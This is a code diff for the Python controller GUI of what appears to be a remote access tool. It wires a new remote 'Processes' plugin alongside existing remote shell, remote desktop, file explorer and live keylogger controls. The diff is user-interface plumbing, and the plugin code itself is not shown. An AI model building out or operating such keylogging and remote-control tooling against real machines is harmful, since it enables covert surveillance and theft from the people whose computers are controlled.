@@ -26,6 +26,7 @@ from plugins.mexplorer import main as mexplorer
 from plugins.mshell import main as mshell
 from plugins.mdesktop import main as mdesktop
 from plugins.mkeylogger import main as mkeylogger
+from plugins.mprocesses import main as mprocesses
 
 # initial geo ip database
 geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
@@ -84,6 +85,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteDesktopButton.setDisabled(True)
         self.remoteDesktopButton2.setDisabled(True)
         self.remoteKeyloggerButton.setDisabled(True)
+        self.remoteProcessesButton.setDisabled(True)
         self.lockServerButton.setDisabled(True)
         self.lockServerButton.setVisible(False)
         self.quitServerButton.setDisabled(True)
@@ -128,6 +130,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteDesktopButton.clicked.connect(lambda: self.run_plugin('desktopMode'))
         self.remoteDesktopButton2.clicked.connect(lambda: self.run_plugin('desktopMode'))
         self.remoteKeyloggerButton.clicked.connect(lambda: self.run_plugin('keyloggerMode'))
+        self.remoteProcessesButton.clicked.connect(lambda: self.run_plugin('processesMode'))
 
         # Custom signal for update server table
         self.connect(self, SIGNAL('updateTable()'), self.updateServersTable)
@@ -137,6 +140,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
         self.connect(self, SIGNAL('executeDesktop()'), lambda: self.execute_plugin(plugin='desktop'))
         self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_plugin(plugin='keylogger'))
+        self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_plugin(plugin='processes'))
 
     # Start Listen for Servers
     def listen_start(self):
@@ -251,8 +255,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                             self.send_run_signal(self.sock, mode)
 
-                    except ValueError as e:
-                        print e
+                    except ValueError:
+                        pass
 
     # Servers Live Update
     def check_servers(self):
@@ -385,6 +389,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteDesktopButton.setDisabled(True)
                 self.remoteDesktopButton2.setDisabled(True)
                 self.remoteKeyloggerButton.setDisabled(True)
+                self.remoteProcessesButton.setDisabled(True)
                 self.lockServerButton.setVisible(False)
                 self.lockServerButton.setDisabled(True)
                 self.quitServerButton.setDisabled(True)
@@ -395,6 +400,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteDesktopButton.setDisabled(False)
                 self.remoteDesktopButton2.setDisabled(False)
                 self.remoteKeyloggerButton.setDisabled(False)
+                self.remoteProcessesButton.setDisabled(False)
                 self.lockServerButton.setVisible(True)
                 self.lockServerButton.setDisabled(False)
                 self.quitServerButton.setDisabled(False)
@@ -408,6 +414,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.remoteDesktopButton.setDisabled(True)
             self.remoteDesktopButton2.setDisabled(True)
             self.remoteKeyloggerButton.setDisabled(True)
+            self.remoteProcessesButton.setDisabled(True)
             self.lockServerButton.setVisible(False)
             self.lockServerButton.setDisabled(True)
             self.quitServerButton.setDisabled(True)
@@ -437,6 +444,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                       lambda: self.run_plugin('desktopMode'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger',
                                       lambda: self.run_plugin('keyloggerMode'))
+                server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), 'Processes',
+                                      lambda: self.run_plugin('processesMode'))
 
                 server_menu.addSeparator()
                 server_menu.addMenu(server_options_menu)
@@ -461,7 +470,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'explorerMode': 'executeExplorer()',
             'audioMode': 'executeAudio()',
             'desktopMode': 'executeDesktop()',
-            'keyloggerMode': 'executeKeylogger()'
+            'keyloggerMode': 'executeKeylogger()',
+            'processesMode': 'executeProcesses()'
         }
         if signal in signals:
             self.current_sock = sock
@@ -473,7 +483,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'explorer': mexplorer,
             'audio': maudio,
             'desktop': mdesktop,
-            'keylogger': mkeylogger
+            'keylogger': mkeylogger,
+            'processes': mprocesses
         }
 
         server = self.current_server()
